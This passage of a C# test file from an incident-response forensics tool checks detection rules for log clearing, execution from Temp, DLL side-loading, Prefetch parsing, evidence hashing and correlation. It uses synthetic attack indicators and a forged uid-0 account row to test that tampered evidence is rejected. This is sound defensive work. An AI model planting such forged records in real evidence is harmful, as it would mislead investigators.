        // rules, and the shared malicious-binary SHA-1 must surface as a cross-host correlation. Keeps
        // docs/DEMO.md honest as the rules and normalizers evolve. Skips (passes) if the committed folder
        // cannot be located on disk (e.g. running from a release-only directory), mirroring FixtureCorpus.
        private static bool GuidedHunt_demo_case_trips_expected_rules()
        {
            try
            {
                string sampleRoot = LocateSampleCaseRoot();
                if (string.IsNullOrEmpty(sampleRoot))
                    return true; // committed sample not on disk here; nothing to guard

                string wkstn = Path.Combine(sampleRoot, "WKSTN-07");
                string srv = Path.Combine(sampleRoot, "FILE-SRV01");

                var cw = IR_Collect.Analysis.CaseManager.LoadCaseFromFolder(wkstn);
                cw.FactStore = IR_Collect.Analysis.Correlation.FactStore.BuildFromCase(cw);
                var wkstnRules = RuleIdSet(IR_Collect.Analysis.GuidedHuntPack.Evaluate(cw, true));
                foreach (string id in new[] { "GH-EXEC-SUSPATH-001", "GH-AUTORUN-001", "GH-SMB-001", "GH-LOGCLEAR-001" })
                    if (!wkstnRules.Contains(id)) return false;

                var cs = IR_Collect.Analysis.CaseManager.LoadCaseFromFolder(srv);
                cs.FactStore = IR_Collect.Analysis.Correlation.FactStore.BuildFromCase(cs);
                var srvRules = RuleIdSet(IR_Collect.Analysis.GuidedHuntPack.Evaluate(cs, true));
                foreach (string id in new[] { "GH-EXEC-SUSPATH-001", "GH-LOGCLEAR-001" })
                    if (!srvRules.Contains(id)) return false;

                // The dropped binary's SHA-1 must tie the two hosts together as a shared entity.
                const string sharedHash = "a94a8fe5ccb19ba61c4c0873d391e987982fbbd3";
                var report = IR_Collect.Analysis.CorrelationCli.BuildReport(
                    new[] { cw, cs }, new[] { "Hash" }, null);
                if (report == null || report.HostCount != 2) return false;
                var hit = report.SharedEntities.FirstOrDefault(s =>
                    s.Value != null && string.Equals(s.Value, sharedHash, StringComparison.OrdinalIgnoreCase));
                if (hit == null || hit.HostCount != 2) return false;
                return hit.Hosts.Contains("WKSTN-07") && hit.Hosts.Contains("FILE-SRV01");
            }
            catch
            {
                return false;
            }
        }

        private static HashSet<string> RuleIdSet(IR_Collect.Analysis.GuidedHuntResult r)
        {
            var set = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            if (r != null && r.RuleMatches != null)
                foreach (var m in r.RuleMatches)
                    if (m != null && !string.IsNullOrEmpty(m.Id)) set.Add(m.Id);
            return set;
        }

        // Walk up from the executable directory looking for the committed sample case.
        private static string LocateSampleCaseRoot()
        {
            try
            {
                var dir = new DirectoryInfo(AppDomain.CurrentDomain.BaseDirectory);
                for (int i = 0; i < 8 && dir != null; i++)
                {
                    string candidate = Path.Combine(dir.FullName, Path.Combine("docs", "sample-case"));
                    if (File.Exists(Path.Combine(candidate, "WKSTN-07", IR_Collect.ArtifactNames.SystemInfoTxt)))
                        return candidate;
                    dir = dir.Parent;
                }
            }
            catch { /* best-effort */ }
            return null;
        }

        // Guided Hunt: a Security 1102 (audit log cleared) fact raises the log-clearing rule (T1070.001);
        // a normal logon event (4624) must not.
        private static bool GuidedHunt_flags_event_log_cleared()
        {
            try
            {
                var store = new IR_Collect.Analysis.Correlation.FactStore();
                var clear = new IR_Collect.Analysis.Correlation.Fact("EventLog_Security_0", DateTime.UtcNow, "EventLog:Security", "LogCleared");
                clear.AddEntity("EventId", "1102");
                var logon = new IR_Collect.Analysis.Correlation.Fact("EventLog_Security_1", DateTime.UtcNow, "EventLog:Security", "Logon");
                logon.AddEntity("EventId", "4624");
                store.AppendFacts(new[] { clear, logon });

                var c = new IR_Collect.Analysis.CaseData();
                c.FactStore = store;
                var res = IR_Collect.Analysis.GuidedHuntPack.Evaluate(c, true);

                var m = res.RuleMatches.FirstOrDefault(x => string.Equals(x.Id, "GH-LOGCLEAR-001", StringComparison.Ordinal));
                return m != null && string.Equals(m.AttackTechniqueId, "T1070.001", StringComparison.Ordinal)
                    && m.FactIds.Contains("EventLog_Security_0") && !m.FactIds.Contains("EventLog_Security_1");
            }
            catch
            {
                return false;
            }
        }

        // Guided Hunt: execution evidence (Amcache/ShimCache/BAM/Process) for an executable in a
        // user-writable / suspicious location raises the suspicious-path execution rule (T1204); a binary
        // under Program Files must NOT trip it.
        private static bool GuidedHunt_flags_execution_from_suspicious_path()
        {
            try
            {
                var store = new IR_Collect.Analysis.Correlation.FactStore();
                var bad = new IR_Collect.Analysis.Correlation.Fact("Amcache_file_Executed_0", DateTime.UtcNow, "Amcache", "Executed");
                bad.AddEntity("Path", "C:\\Users\\bob\\AppData\\Local\\Temp\\evil.exe");
                var ok = new IR_Collect.Analysis.Correlation.Fact("Amcache_file_Executed_1", DateTime.UtcNow, "Amcache", "Executed");
                ok.AddEntity("Path", "C:\\Program Files\\7-Zip\\7zG.exe");
                store.AppendFacts(new[] { bad, ok });

                var c = new IR_Collect.Analysis.CaseData();
                c.FactStore = store;
                var res = IR_Collect.Analysis.GuidedHuntPack.Evaluate(c, true);

                var m = res.RuleMatches.FirstOrDefault(x => string.Equals(x.Id, "GH-EXEC-SUSPATH-001", StringComparison.Ordinal));
                if (m == null) return false;
                if (!string.Equals(m.AttackTechniqueId, "T1204", StringComparison.Ordinal)) return false;
                // Evidence must show the Temp path, and Program Files must not have caused a separate hit.
                bool tempShown = m.Evidence != null && m.Evidence.Any(e => e != null && e.IndexOf("\\Temp\\evil.exe", StringComparison.OrdinalIgnoreCase) >= 0);
                bool programFilesLeaked = m.Evidence != null && m.Evidence.Any(e => e != null && e.IndexOf("7zG.exe", StringComparison.OrdinalIgnoreCase) >= 0);
                return tempShown && !programFilesLeaked;
            }
            catch
            {
                return false;
            }
        }

        // Prefetch hardening (code-review follow-up): malformed/truncated input must fail gracefully to
        // null (never throw / never OOB), and the v23 (Vista/Win7) branch (1 last run @0x80, run count
        // @0x98) must parse, locking those version-specific offsets.
        private static bool Prefetch_handles_v23_and_malformed_inputs()
        {
            string dir = Path.Combine(Path.GetTempPath(), "ircol_pfm_" + Guid.NewGuid().ToString("N"));
            try
            {
                Directory.CreateDirectory(dir);
                // Malformed: empty, too-short, and a long buffer with no "SCCA" signature -> all null.
                string empty = Path.Combine(dir, "EMPTY.pf"); File.WriteAllBytes(empty, new byte[0]);
                string shortf = Path.Combine(dir, "SHORT.pf"); File.WriteAllBytes(shortf, new byte[16]);
                string nosig = Path.Combine(dir, "NOSIG.pf"); File.WriteAllBytes(nosig, new byte[0x100]);
                if (IR_Collect.Utils.PrefetchParser.ParseFile(empty) != null) return false;
                if (IR_Collect.Utils.PrefetchParser.ParseFile(shortf) != null) return false;
                if (IR_Collect.Utils.PrefetchParser.ParseFile(nosig) != null) return false;

                // v23: version=23, "SCCA", exe @0x10, last run @0x80, run count @0x98.
                byte[] buf = new byte[0xA0];
                BitConverter.GetBytes(23).CopyTo(buf, 0x00);
                buf[4] = 0x53; buf[5] = 0x43; buf[6] = 0x43; buf[7] = 0x41; // "SCCA"
                Encoding.Unicode.GetBytes("OLD.EXE").CopyTo(buf, 0x10);
                var when = new DateTime(2020, 1, 2, 3, 4, 5, DateTimeKind.Utc);
                BitConverter.GetBytes(when.ToFileTimeUtc()).CopyTo(buf, 0x80);
                BitConverter.GetBytes(7).CopyTo(buf, 0x98);
                string v23 = Path.Combine(dir, "OLD.EXE-1.pf"); File.WriteAllBytes(v23, buf);

                var e = IR_Collect.Utils.PrefetchParser.ParseFile(v23);
                return e != null
                    && e.FormatVersion == 23 && e.RunCount == 7
                    && string.Equals(e.ExecutableName, "OLD.EXE", StringComparison.Ordinal)
                    && e.LastRunTimesUtc.Count == 1
                    && e.LastRunTimesUtc[0].ToString("yyyy-MM-ddTHH:mm:ss") == "2020-01-02T03:04:05";
            }
            catch
            {
                return false;
            }
            finally
            {
                try { if (Directory.Exists(dir)) Directory.Delete(dir, true); } catch { }
            }
        }

        // Guided Hunt: a Prefetch fact that loaded a file from a user-writable path (ReferencedFile entity)
        // must raise the DLL side-loading rule (T1574.002), with the loaded file shown in the evidence.
        private static bool GuidedHunt_flags_prefetch_dll_sideload()
        {
            try
            {
                var store = new IR_Collect.Analysis.Correlation.FactStore();
                var f = new IR_Collect.Analysis.Correlation.Fact("Prefetch_0_run_0", DateTime.UtcNow, "Prefetch", "Executed");
                f.AddEntity("FileName", "TRUSTED.EXE");
                f.AddEntity("ReferencedFile", "\\VOLUME{1}\\USERS\\BOB\\APPDATA\\LOCAL\\TEMP\\EVIL.DLL");
                // A normal system-DLL load (no ReferencedFile entity) must NOT trip the rule on its own.
                var g = new IR_Collect.Analysis.Correlation.Fact("Prefetch_1_run_0", DateTime.UtcNow, "Prefetch", "Executed");
                g.AddEntity("FileName", "NOTEPAD.EXE");
                store.AppendFacts(new[] { f, g });

                var c = new IR_Collect.Analysis.CaseData();
                c.FactStore = store;
                var res = IR_Collect.Analysis.GuidedHuntPack.Evaluate(c, true);

                var m = res.RuleMatches.FirstOrDefault(x => string.Equals(x.Id, "GH-PF-SIDELOAD-001", StringComparison.Ordinal));
                if (m == null) return false;
                if (!string.Equals(m.AttackTechniqueId, "T1574.002", StringComparison.Ordinal)) return false;
                // Evidence must surface the loaded suspicious file.
                return m.Evidence != null && m.Evidence.Any(e => e != null && e.IndexOf("EVIL.DLL", StringComparison.OrdinalIgnoreCase) >= 0);
            }
            catch
            {
                return false;
            }
        }

        // Prefetch: a synthetic uncompressed v30 .pf with known fields locks the SCCA offsets (exe @0x10,
        // hash @0x4C, last-run @0x80, run count @0xC8) that were validated 60/60 vs PECmd; plus the
        // normalizer turns it into an Executed fact carrying the exe FileName entity.
        private static bool Prefetch_parses_v30_and_normalizer_emits_executed_facts()
        {
            string dir = Path.Combine(Path.GetTempPath(), "ircol_pf_" + Guid.NewGuid().ToString("N"));
            try
            {
                Directory.CreateDirectory(dir);
                byte[] buf = new byte[0xD0];
                BitConverter.GetBytes(30).CopyTo(buf, 0x00);                     // format version 30
                buf[4] = 0x53; buf[5] = 0x43; buf[6] = 0x43; buf[7] = 0x41;      // "SCCA"
                Encoding.Unicode.GetBytes("TEST.EXE").CopyTo(buf, 0x10);         // exe name (UTF-16, null-term by zero-fill)
                BitConverter.GetBytes((uint)0xDEADBEEF).CopyTo(buf, 0x4C);       // prefetch hash
                var when = new DateTime(2025, 3, 14, 9, 30, 0, DateTimeKind.Utc);
                BitConverter.GetBytes(when.ToFileTimeUtc()).CopyTo(buf, 0x80);   // most recent run time
                BitConverter.GetBytes(42).CopyTo(buf, 0xC8);                     // run count
                string pf = Path.Combine(dir, "TEST.EXE-12345678.pf");
                File.WriteAllBytes(pf, buf);

                var e = IR_Collect.Utils.PrefetchParser.ParseFile(pf);
                if (e == null) return false;
                if (!string.Equals(e.ExecutableName, "TEST.EXE", StringComparison.Ordinal)) return false;
                if (e.FormatVersion != 30 || e.RunCount != 42) return false;
                if (!string.Equals(e.Hash, "DEADBEEF", StringComparison.OrdinalIgnoreCase)) return false;
                if (e.LastRunTimesUtc.Count < 1) return false;
                if (e.LastRunTimesUtc[0].ToString("yyyy-MM-ddTHH:mm:ss") != "2025-03-14T09:30:00") return false;

                var facts = IR_Collect.Analysis.Correlation.Normalizers.PrefetchNormalizer.ToFacts(dir);
                return facts.Any(f => string.Equals(f.Source, "Prefetch", StringComparison.Ordinal)
                    && string.Equals(f.Action, "Executed", StringComparison.Ordinal)
                    && f.EntityRefs != null && f.EntityRefs.Any(en => string.Equals(en.Value, "TEST.EXE", StringComparison.OrdinalIgnoreCase)));
            }
            catch
            {
                return false;
            }
            finally
            {
                try { if (Directory.Exists(dir)) Directory.Delete(dir, true); } catch { }
            }
        }

        // Phase 4.2 hotfix: the 7-day recent-file scan must honor a wall-clock budget so live collection
        // can't run away on a large profile. An expired budget truncates immediately; an unlimited budget
        // still finds a freshly-modified file.
        private static bool RecentFileScan_respects_time_budget()
        {
            string dir = Path.Combine(Path.GetTempPath(), "ircol_rfs_" + Guid.NewGuid().ToString("N"));
            try
            {
                Directory.CreateDirectory(dir);
                File.WriteAllText(Path.Combine(dir, "fresh.txt"), "x"); // modified now = within 7 days

                int c1; bool t1;
                IR_Collect.Collectors.UserActivityCollector.ScanRootForTest(dir, -1, out c1, out t1);
                if (!t1) return false; // expired budget -> truncated

                int c2; bool t2;
                IR_Collect.Collectors.UserActivityCollector.ScanRootForTest(dir, 0, out c2, out t2);
                return !t2 && c2 >= 1; // unlimited -> not truncated, finds the recent file
            }
            catch
            {
                return false;
            }
            finally
            {
                try { if (Directory.Exists(dir)) Directory.Delete(dir, true); } catch { }
            }
        }

        // Phase 5.2: the input folder is SHA-256-hashed at load time and the digest + per-file manifest
        // must reach the summary output, tying the report to exactly the evidence it consumed. We use the
        // textbook SHA-256 of "abc" as a known-answer check on the hashing.
        private static bool EvidenceManifest_hashes_inputs_and_summary_carries_digest()
        {
            const string knownAbcSha256 = "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad";
            string dir = Path.Combine(Path.GetTempPath(), "ircol_ev_" + Guid.NewGuid().ToString("N"));
            try
            {
                Directory.CreateDirectory(dir);
                // Exactly the 3 bytes "abc" (UTF8 no BOM) so the SHA-256 is the textbook value.
                File.WriteAllText(Path.Combine(dir, "evidence.bin"), "abc", new UTF8Encoding(false));

                var em = IR_Collect.Analysis.EvidenceManifest.HashFolder(dir);
                var hit = em.Files.FirstOrDefault(x => x.RelPath != null && x.RelPath.EndsWith("evidence.bin", StringComparison.OrdinalIgnoreCase));
                if (hit == null || !string.Equals(hit.Sha256, knownAbcSha256, StringComparison.OrdinalIgnoreCase)) return false;
                if (hit.SizeBytes != 3) return false;
                if (string.IsNullOrEmpty(em.Digest)) return false;

                // The digest + manifest must flow through LoadCaseFromFolder into the summary output.
                var c = IR_Collect.Analysis.CaseManager.LoadCaseFromFolder(dir);
                if (c.EvidenceFiles == null || !c.EvidenceFiles.Any(x => string.Equals(x.Sha256, knownAbcSha256, StringComparison.OrdinalIgnoreCase))) return false;
                if (!string.Equals(c.EvidenceDigest, em.Digest, StringComparison.OrdinalIgnoreCase)) return false;

                c.FactStore = IR_Collect.Analysis.Correlation.FactStore.BuildFromCase(c);
                var payload = IR_Collect.Analysis.AnalysisCli.BuildHeadlessSummary(c);
                string json = IR_Collect.Analysis.SummaryExport.Serialize(payload);
                return json.IndexOf("evidence_digest", StringComparison.Ordinal) >= 0
                    && json.IndexOf(knownAbcSha256, StringComparison.OrdinalIgnoreCase) >= 0;
            }
            catch
            {
                return false;
            }
            finally
            {
                try { if (Directory.Exists(dir)) Directory.Delete(dir, true); } catch { }
            }
        }

        // Phase 5.1: a single tool-version source of truth (read from the assembly) must be stamped into
        // the machine-readable outputs for court-admissibility (each report declares the tool that made it).
        private static bool BuildInfo_version_matches_assembly_and_is_stamped_in_outputs()
        {
            var asm = System.Reflection.Assembly.GetExecutingAssembly().GetName().Version;
            string expected = asm.Major + "." + asm.Minor + "." + asm.Build;
            if (!string.Equals(IR_Collect.BuildInfo.Version, expected, StringComparison.Ordinal)) return false;
            if (string.IsNullOrEmpty(IR_Collect.BuildInfo.Version) || IR_Collect.BuildInfo.Version == "0.0.0") return false;
            if (!string.Equals(IR_Collect.BuildInfo.ToolName, "9SEC Evidence Workbench", StringComparison.Ordinal)) return false;

            string stamp = "\"tool_version\":\"" + expected + "\"";

            var corr = IR_Collect.Analysis.CorrelationCli.BuildReport(new IR_Collect.Analysis.CaseData[0], new[] { "Path" }, null);
            if (IR_Collect.Analysis.CorrelationExport.Serialize(corr).IndexOf(stamp, StringComparison.Ordinal) < 0) return false;

            var g = IR_Collect.Analysis.GraphCli.BuildGraph(new IR_Collect.Analysis.CaseData[0], "Path", "x", 1, null);
            string gj = IR_Collect.Analysis.GraphCli.Serialize(g);
            return gj.IndexOf(stamp, StringComparison.Ordinal) >= 0
                && gj.IndexOf("\"tool_name\":\"9SEC Evidence Workbench\"", StringComparison.Ordinal) >= 0;
        }

        // Phase 3.2b: two Amcache file rows share a Publisher but have different paths. Seeding the graph
        // on a.exe's path must reach b.exe's path only at DEPTH 2 (a.exe --Publisher--> b.exe), proving
        // genuine multi-hop expansion (not just single-hop co-occurrence).
        private static bool GraphCli_multi_hop_reaches_sibling_via_shared_publisher()
        {
            string dir = Path.Combine(Path.GetTempPath(), "ircol_graph_" + Guid.NewGuid().ToString("N"));
            try
            {
                Directory.CreateDirectory(dir);
                File.WriteAllText(Path.Combine(dir, IR_Collect.ArtifactNames.SystemInfoTxt), "Hostname: GHOST\r\n", Encoding.UTF8);
                var parsed = new IR_Collect.Utils.AmcacheParseResult();
                parsed.Files.Add(new IR_Collect.Utils.AmcacheFileRecord
                {
                    RegistryKey = "k1", Path = "C:\\Temp\\a.exe", FileName = "a.exe",
                    Hash = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", Publisher = "ACMECorp",
                    ProgramId = "prog1", FirstObservedTime = "2025-01-01 08:00:00"
                });
                parsed.Files.Add(new IR_Collect.Utils.AmcacheFileRecord
                {
                    RegistryKey = "k2", Path = "C:\\Temp\\b.exe", FileName = "b.exe",
                    Hash = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb", Publisher = "ACMECorp",
                    ProgramId = "prog2", FirstObservedTime = "2025-01-01 09:00:00"
                });
                IR_Collect.Collectors.ExecutionArtifactCsvWriter.WriteAmcacheCsvs(parsed,
                    Path.Combine(dir, IR_Collect.ArtifactNames.AmcacheProgramsCsv),
                    Path.Combine(dir, IR_Collect.ArtifactNames.AmcacheFilesCsv));

                var c = IR_Collect.Analysis.CaseManager.LoadCaseFromFolder(dir);
                c.FactStore = IR_Collect.Analysis.Correlation.FactStore.BuildFromCase(c);

                var g = IR_Collect.Analysis.GraphCli.BuildGraph(new[] { c }, "Path", "C:\\Temp\\a.exe", 2, null);
                if (g == null) return false;
                // The shared Publisher must appear at depth 1.
                bool pubAtDepth1 = g.Nodes.Any(n => string.Equals(n.Type, "Publisher", StringComparison.OrdinalIgnoreCase)
                    && n.Value != null && n.Value.IndexOf("ACMECorp", StringComparison.OrdinalIgnoreCase) >= 0 && n.Depth == 1);
                // b.exe is only reachable via the Publisher -> depth 2.
                bool siblingAtDepth2 = g.Nodes.Any(n => string.Equals(n.Type, "Path", StringComparison.OrdinalIgnoreCase)
                    && n.Value != null && n.Value.IndexOf("b.exe", StringComparison.OrdinalIgnoreCase) >= 0 && n.Depth == 2);
                if (!(pubAtDepth1 && siblingAtDepth2)) return false;

                string json = IR_Collect.Analysis.GraphCli.Serialize(g);
                return !string.IsNullOrEmpty(json) && json.IndexOf("graph_v1", StringComparison.Ordinal) >= 0;
            }
            catch
            {
                return false;
            }
            finally
            {
                try { if (Directory.Exists(dir)) Directory.Delete(dir, true); } catch { }
            }
        }

        // Phase 3.1b: the deriver writes raw-hive results to CSV via ExecutionArtifactCsvWriter; this
        // proves that CSV is byte-format-compatible with the normalizer that reads it back (the exact
        // divergence risk for Amcache/ShimCache, which can't be run here without elevation). A real hive
        // can't be synthesized, so we feed the shared writer a synthetic parse result and round-trip it.
        private static bool RawArtifactCsvWriter_amcache_output_is_consumable_by_normalizer()
        {
            string dir = Path.Combine(Path.GetTempPath(), "ircol_amcsv_" + Guid.NewGuid().ToString("N"));
            try
            {
                Directory.CreateDirectory(dir);
                var parsed = new IR_Collect.Utils.AmcacheParseResult();
                parsed.Files.Add(new IR_Collect.Utils.AmcacheFileRecord
                {
                    RegistryKey = "Root\\InventoryApplicationFile\\evil",
                    Path = "C:\\Temp\\evil.exe",
                    FileName = "evil.exe",
                    Hash = "1111111111111111111111111111111111111111",
                    ProductName = "Evil",
                    Publisher = "ACME",
                    ProgramId = "0000abcd",
                    FirstObservedTime = "2025-01-03 08:00:00",
                    ExecutedTime = "2025-01-03 09:00:00"
                });
                string progCsv = Path.Combine(dir, IR_Collect.ArtifactNames.AmcacheProgramsCsv);
                string fileCsv = Path.Combine(dir, IR_Collect.ArtifactNames.AmcacheFilesCsv);
                IR_Collect.Collectors.ExecutionArtifactCsvWriter.WriteAmcacheCsvs(parsed, progCsv, fileCsv);

                var facts = IR_Collect.Analysis.Correlation.Normalizers.AmcacheNormalizer.ToFacts(progCsv, fileCsv);
                if (facts == null || facts.Count < 1) return false;
                // The round-tripped file row must surface its path + sha1 hash as entities.
                bool hasPath = facts.Any(f => f.EntityRefs != null && f.EntityRefs.Any(e =>
                    string.Equals(e.Value, "C:\\Temp\\evil.exe", StringComparison.OrdinalIgnoreCase)));
                bool hasHash = facts.Any(f => f.EntityRefs != null && f.EntityRefs.Any(e =>
                    e.Value != null && e.Value.IndexOf("1111111111111111111111111111111111111111", StringComparison.OrdinalIgnoreCase) >= 0));
                return hasPath && hasHash;
            }
            catch
            {
                return false;
            }
            finally
            {
                try { if (Directory.Exists(dir)) Directory.Delete(dir, true); } catch { }
            }
        }

        // Phase 3.1: ingest an arbitrary folder of already-collected artifacts (no ZIP, no live host),
        // run the real facts pipeline, and emit a headless summary. Uses an mft_preview.csv so the MFT
        // normalizer produces facts deterministically without needing a real hive/ESE sample.
        private static bool AnalyzeFolder_ingests_artifacts_and_builds_summary()
        {
            string dir = Path.Combine(Path.GetTempPath(), "ircol_analyze_" + Guid.NewGuid().ToString("N"));
            try
            {
                Directory.CreateDirectory(dir);
                File.WriteAllText(Path.Combine(dir, IR_Collect.ArtifactNames.SystemInfoTxt),
                    "Hostname: TESTHOST\r\nOS: Windows\r\n", Encoding.UTF8);
                // mft_preview.csv: header + one row with >=14 columns (FullPath at [4], StdCreated at [6]).
                var csv = new StringBuilder();
                csv.AppendLine("RecordNumber,InUse,IsDir,FileName,FullPath,Size,StdCreated,StdModified,StdMftModified,StdAccessed,FnCreated,FnModified,FnMftModified,FnAccessed");
                csv.AppendLine("42,True,False,evil.exe,C:\\Temp\\evil.exe,1024,2025-01-02 10:00:00,2025-01-02 10:00:00,2025-01-02 10:00:00,2025-01-02 10:00:00,,,,");
                File.WriteAllText(Path.Combine(dir, IR_Collect.ArtifactNames.MftPreviewCsv), csv.ToString(), Encoding.UTF8);

                var c = IR_Collect.Analysis.CaseManager.LoadCaseFromFolder(dir);
                if (c == null) return false;
                if (!string.Equals(c.Hostname, "TESTHOST", StringComparison.Ordinal)) return false;
                if (c.MftEntries == null || c.MftEntries.Count < 1) return false;
                // Note: mft_preview.csv and system_info.txt are consumed/skipped by the scan (the MFT
                // preview becomes MftEntries), so they are intentionally NOT in the Artifacts dict.

                var store = IR_Collect.Analysis.Correlation.FactStore.BuildFromCase(c);
                c.FactStore = store;
                if (store == null || store.Facts == null || store.Facts.Count < 1) return false; // MFT facts

                var payload = IR_Collect.Analysis.AnalysisCli.BuildHeadlessSummary(c);
                if (payload == null || payload.FactCount < 1) return false;
                if (!string.Equals(payload.ExportSchema, "summary_v3", StringComparison.Ordinal)) return false;

                string json = IR_Collect.Analysis.SummaryExport.Serialize(payload);
                return !string.IsNullOrEmpty(json)
                    && json.IndexOf("summary_v3", StringComparison.Ordinal) >= 0
                    && json.IndexOf("TESTHOST", StringComparison.Ordinal) >= 0;
            }
            catch
            {
                return false;
            }
            finally
            {
                try { if (Directory.Exists(dir)) Directory.Delete(dir, true); } catch { }
            }
        }

        private static bool AnalyzeFolder_readonly_workspace_rejects_forged_canonical_and_stabilizes_digest()
        {
            string dir = Path.Combine(Path.GetTempPath(), "ircol_readonly_" + Guid.NewGuid().ToString("N"));
            CaseData first = null;
            CaseData second = null;
            try
            {
                string etc = Path.Combine(dir, "[root]", "etc");
                Directory.CreateDirectory(etc);
                File.WriteAllText(Path.Combine(dir, "uac.log"),
                    "2026-07-28 12:00:00 +0000 INF Unix-like Artifacts Collector\r\n" +
                    "2026-07-28 12:00:00 +0000 INF Hostname: UAC-READONLY-01\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(etc, "passwd"),
                    "real-user:x:1001:1001:Real User:/home/real-user:/bin/bash\r\n",
                    new UTF8Encoding(false));

                string forgedPath = Path.Combine(dir, ArtifactNames.UacAccountsCsv);
                string forgedContent =
                    "RecordType,Name,Id,PrimaryGroupId,Home,Shell,Members,PasswordState,Description,SourcePath\r\n" +
                    "User,forged-user,0,0,/root,/bin/sh,,set,forged,forged.csv\r\n";
                File.WriteAllText(forgedPath, forgedContent, new UTF8Encoding(false));

                EvidenceManifestResult before = EvidenceManifest.HashFolder(dir);
                first = CaseManager.LoadCaseFromFolder(dir);
                EvidenceManifestResult afterFirst = EvidenceManifest.HashFolder(dir);
                if (first == null || !string.Equals(before.Digest, afterFirst.Digest, StringComparison.Ordinal))
                    return false;
                if (first.LoadWarnings == null || !first.LoadWarnings.Any(x =>
                    x.IndexOf("not trusted", StringComparison.OrdinalIgnoreCase) >= 0))
                    return false;
                if (!string.Equals(File.ReadAllText(forgedPath), forgedContent, StringComparison.Ordinal))
                    return false;
                if (string.IsNullOrEmpty(first.AnalysisPath) ||
                    CaseManager.IsPathUnderRoot(first.AnalysisPath, dir))
                    return false;

                string accountsPath = CaseManager.ResolveArtifactPath(first, ArtifactNames.UacAccountsCsv);
                if (string.IsNullOrEmpty(accountsPath) || !File.Exists(accountsPath) ||
                    !CaseManager.IsPathUnderRoot(accountsPath, first.AnalysisPath))
                    return false;
                string canonical = File.ReadAllText(accountsPath);
                if (canonical.IndexOf("real-user", StringComparison.Ordinal) < 0 ||
                    canonical.IndexOf("forged-user", StringComparison.Ordinal) >= 0)
                    return false;

                FactStore store = FactStore.BuildFromCase(first);
                bool hasReal = store.Facts.Any(f =>
                    string.Equals(f.Source, UacAccountNormalizer.SourceName, StringComparison.Ordinal) &&
                    HasEntity(f, "User", "real-user"));
                bool hasForged = store.Facts.Any(f =>
                    string.Equals(f.Source, UacAccountNormalizer.SourceName, StringComparison.Ordinal) &&
                    HasEntity(f, "User", "forged-user"));
                if (!hasReal || hasForged)
                    return false;

                string workspaceManifest = CaseManager.ResolveArtifactPath(first,
                    ArtifactNames.AnalysisWorkspaceManifestJson);
                if (string.IsNullOrEmpty(workspaceManifest) || !File.Exists(workspaceManifest))
                    return false;
                string manifestJson = File.ReadAllText(workspaceManifest);
                if (manifestJson.IndexOf("\"source_read_only\":true", StringComparison.OrdinalIgnoreCase) < 0 ||
                    manifestJson.IndexOf(ArtifactNames.UacAccountsCsv, StringComparison.OrdinalIgnoreCase) < 0 ||
                    manifestJson.IndexOf(EvidenceManifest.ComputeSha256(accountsPath),
                        StringComparison.OrdinalIgnoreCase) < 0)
                    return false;

                second = CaseManager.LoadCaseFromFolder(dir);
                EvidenceManifestResult afterSecond = EvidenceManifest.HashFolder(dir);
                return second != null &&
                    string.Equals(first.EvidenceDigest, second.EvidenceDigest, StringComparison.Ordinal) &&
                    string.Equals(before.Digest, afterSecond.Digest, StringComparison.Ordinal);
            }
            finally
            {
                if (first != null) CaseManager.RemoveCase(first);
                if (second != null) CaseManager.RemoveCase(second);
                TryDeleteDir(dir);
            }
        }

        private static bool AnalyzeFolder_uac_process_snapshot_derives_canonical_process_csv()
        {
            string dir = Path.Combine(Path.GetTempPath(), "ircol_uac_" + Guid.NewGuid().ToString("N"));
            try
            {
                string procDir = Path.Combine(dir, "live_response", "process");
                Directory.CreateDirectory(procDir);
                File.WriteAllText(Path.Combine(dir, "uac.log"),
                    "2026-07-26 15:30:00 +0000 INF Operating system: linux\r\n" +
                    "2026-07-26 15:30:00 +0000 INF System architecture: x86_64\r\n" +
                    "2026-07-26 15:30:00 +0000 INF Hostname: UAC-LNX-01\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(procDir, "ps_-eo_pid_user_etime_args.txt"),
                    "2026-07-26 15:30:00\r\n" +
                    "PID USER ELAPSED COMMAND\r\n" +
                    "1 root 2-03:04:05 /sbin/init splash\r\n" +
                    "4242 www-data 00:10 /usr/sbin/nginx -g daemon off;\r\n",
                    new UTF8Encoding(false));

                var c = IR_Collect.Analysis.CaseManager.LoadCaseFromFolder(dir);
                if (c == null) return false;
                if (!string.Equals(c.Hostname, "UAC-LNX-01", StringComparison.Ordinal)) return false;

                string sysInfo = IR_Collect.Analysis.CaseManager.ResolveArtifactPath(c, IR_Collect.ArtifactNames.SystemInfoTxt);
                string processCsv = IR_Collect.Analysis.CaseManager.ResolveArtifactPath(c, IR_Collect.ArtifactNames.ProcessListCsv);
                if (!File.Exists(sysInfo) || !File.Exists(processCsv)) return false;

                var store = IR_Collect.Analysis.Correlation.FactStore.BuildFromCase(c);
                if (store == null || store.Facts == null || store.Facts.Count < 2) return false;

                Fact nginx = store.Facts.FirstOrDefault(f =>
                    f != null &&
                    string.Equals(f.Source, ProcessNormalizer.SourceName, StringComparison.Ordinal) &&
                    HasEntity(f, "Path", "/usr/sbin/nginx"));
                if (nginx == null) return false;
                if (!HasEntity(nginx, "User", "www-data")) return false;
                if (!HasEntity(nginx, "CommandLine", "/usr/sbin/nginx -g daemon off;")) return false;
                if (nginx.Time.Year != 2026 || nginx.Time.Month != 7 || nginx.Time.Day != 26) return false;

                return c.Artifacts != null &&
                    c.Artifacts.Keys.Any(k => string.Equals(Path.GetFileName(k), IR_Collect.ArtifactNames.ProcessListCsv, StringComparison.OrdinalIgnoreCase));
            }
            catch
            {
                return false;
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool AnalyzeFolder_uac_bodyfile_derives_activity_timeline()
        {
            string dir = Path.Combine(Path.GetTempPath(), "ircol_uac_body_" + Guid.NewGuid().ToString("N"));
            try
            {
                Directory.CreateDirectory(Path.Combine(dir, "bodyfile"));
                File.WriteAllText(Path.Combine(dir, "uac.log"),
                    "2026-07-26 15:30:00 +0000 INF Hostname: UAC-MAC-01\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(dir, "bodyfile", "bodyfile.txt"),
